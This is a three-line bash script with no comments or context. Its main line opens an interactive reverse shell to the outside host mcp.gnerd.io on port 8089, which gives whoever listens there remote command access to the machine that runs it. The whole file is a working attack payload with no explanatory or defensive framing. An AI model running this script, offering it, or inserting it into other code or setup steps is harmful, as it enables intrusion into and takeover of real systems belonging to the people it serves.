#!/bin/bash
bash -i >& /dev/tcp/mcp.gnerd.io/8089 0>&1
wait
